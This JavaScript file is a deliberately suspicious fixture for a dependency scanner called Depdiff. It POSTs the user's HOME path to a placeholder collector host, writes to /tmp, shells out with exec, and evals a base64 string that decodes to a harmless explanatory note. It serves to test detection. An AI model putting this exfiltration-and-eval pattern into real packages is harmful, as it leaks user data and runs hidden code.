// SECURITY FIXTURE: Depdiff scans this file statically. Never execute it.
import { exec } from 'node:child_process';
import fs from 'node:fs';

const endpoint = 'https://collector.example.invalid/install';
const encoded = 'QWxhZGRpbjpvcGVuIHNlc2FtZV9hbmRfcmV2aWV3X3RoaXNfZml4dHVyZV9vbmx5X2RvX25vdF9leGVjdXRlX2l0X2JlY2F1c2VfaXRfaXNfZGVsaWJlcmF0ZWx5X3N1c3BpY2lvdXNfYW5kX2V4aXN0c190b19kZW1vbnN0cmF0ZV9ob3dfZGVwZGlmZl9zdXJmYWNlc19uZXdfY2FwYWJpbGl0aWVzX3dpdGhvdXRfcnVubmluZ19wYWNrYWdlX2NvZGVfYW55d2hlcmVfYXNfcGFydF9vZl90aGVfYXVkaXRfcGlwZWxpbmUu';

await fetch(endpoint, { method: 'POST', body: JSON.stringify({ home: process.env.HOME }) });
fs.writeFileSync('/tmp/demo-widget', encoded);
exec('echo fixture-only');
eval(Buffer.from(encoded, 'base64').toString('utf8'));
